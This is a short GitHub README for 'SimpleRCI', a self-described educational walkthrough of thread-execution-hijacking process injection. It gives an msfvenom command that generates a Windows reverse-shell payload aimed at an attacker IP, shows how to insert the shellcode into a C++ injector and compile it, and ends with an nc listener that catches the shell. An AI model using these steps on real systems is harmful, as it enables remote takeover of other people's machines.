# SimpleRCI

writing these materials for myself and for educational purposes .i will write long explanetion about every line of code for better understanding ..

after reading the script and understaing its all for educational purposes. 

so what is thread access injection ? 

Thread execution hijacking is a method used to control a running thread in a process. It starts by opening access to a process, then allocating memory within the process, writing malicious code (payload) into the allocated memory, creating a new thread in the process and starting it with the malicious code. This will cause the code to take control of the thread.

we test the script by create a vm in my case is kali linux . 

in the console we type the command below

```
ifconfig
```
then take the vm ip we want to use has a "hacker" machine

```
eth: flags=8908<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 2938
	options=3<RXCSUM,TXCSUM>
	ether xx:xx:xx:xx:xx:xx 
	inet xx.xx.xxx.xx netmask 0xfff0 broadcast xx.xx.xx.xx
```

i choose to use this exploit for the reverseshell , of course you can choose any 

```
msfvenom -p windows/×64/shell_reverse_tc LHOST=xx.xx.xxx.xx LPORT=4444 -f c
```
then we have the shell code 

and we will insert it to ``` shellcode[] = {`here`}```

![Screenshot 2023-01-24 at 10 50 42](https://user-images.githubusercontent.com/122444563/214353717-a4f88edd-6681-48d0-bb67-f75a74b88bd6.png)


once we have the script has it shown in screenshot above 
we will change the filemode for .exe 

```cl /Tc <filename>.cpp```

change back to the vm and listen to the port we specify 
```nc -nlvp 4444```






